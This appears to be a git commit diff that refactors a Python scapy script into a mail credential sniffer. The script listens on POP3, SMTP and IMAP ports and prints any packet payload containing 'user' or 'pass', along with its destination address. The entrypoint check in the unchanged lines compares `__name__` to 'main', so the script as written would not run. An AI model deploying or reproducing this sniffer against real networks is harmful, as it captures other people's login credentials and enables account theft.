40b05b8e5f0368fe0b373ab6cbfbb10321b6a9ed
Lexnovic <lexnovic@gmail.com>
2024-07-30 19:01:26 +0200

    Mail Sniffer refactoring

--- mail_sniffer.py
+++ mail_sniffer.py
@@ -1,10 +1,18 @@
-from scapy.all import sniff
+from scapy.all import sniff, TCP, IP
 
+# packet callback
 def packet_callback(packet):
-    print(packet.show())
+    if packet[TCP].payload:
+        mypacket = str(packet[TCP].payload)
+        if 'user' in mypacket.lower() or 'pass' in mypacket.lower():
+            print(f"[*] Destination: {packet[IP].dst}")
+            print(f"[*] {str(packet[TCP].payload)}")
+
 
 def main():
-    sniff(prn=packet_callback, count=1)
+    # launch the sniffer
+    sniff(filter='tcp port 110 or tcp port 25 or tcp port 143', prn=packet_callback, store=0)
+
 
 if __name__ == 'main':
     main()
